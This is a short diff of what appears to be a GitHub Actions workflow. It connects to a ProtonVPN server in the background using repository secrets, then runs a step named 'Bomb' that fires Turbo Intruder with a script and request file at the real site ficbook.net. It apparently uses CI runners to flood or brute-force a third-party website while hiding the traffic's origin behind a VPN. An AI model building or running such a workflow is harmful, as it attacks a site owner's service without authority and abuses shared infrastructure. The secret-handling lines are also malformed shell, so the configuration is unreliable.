@@ -32,8 +32,6 @@ jobs:
         sudo apt install resolvconf
         sudo wget "https://raw.githubusercontent.com/ProtonVPN/scripts/master/update-resolv-conf.sh" -O "/etc/openvpn/update-resolv-conf"
         sudo chmod +x "/etc/openvpn/update-resolv-conf"
-        sudo openvpn jp-free-08.protonvpn.net.udp.ovpn
-        ${{ secrets.VL }}
-        ${{ secrets.VP }}
+        (sudo openvpn jp-free-08.protonvpn.net.udp.ovpn; ${{ secrets.VL }}; ${{ secrets.VP }}) &
     - name: Bomb
       run: java -jar turbo-intruder-all.jar beta/script_l.py beta/req.txt https://ficbook.net:433 foo
